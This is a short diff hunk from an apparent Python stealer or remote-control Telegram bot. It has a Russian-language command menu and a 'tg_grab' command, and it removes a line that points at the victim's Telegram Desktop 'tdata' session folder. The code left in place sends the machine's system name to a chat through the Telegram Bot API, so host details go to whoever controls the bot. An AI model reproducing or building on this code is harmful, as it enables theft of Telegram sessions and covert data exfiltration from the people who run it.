@@ -285,7 +285,6 @@ def start(message):
     markup.add(itembtn1, itembtn2, itembtn3, itembtn4, itembtn5, itembtn6, itembtn7, itembtn8, itembtn9, itembtn10, itembtn11)
     bot.send_message(chat_id, "Выберите команду:", reply_markup=markup)
 @bot.message_handler(commands=['tg_grab'])
-source_dir = user + '\\AppData\\Roaming\\Telegram Desktop\\tdata'
 def send_message_to_group(chat_id):
     url = f"https://api.telegram.org/bot{telegram_bot_token}/sendMessage"
     data = {'chat_id': chat_id, 'text': f"System Name: {system_name}\n"}
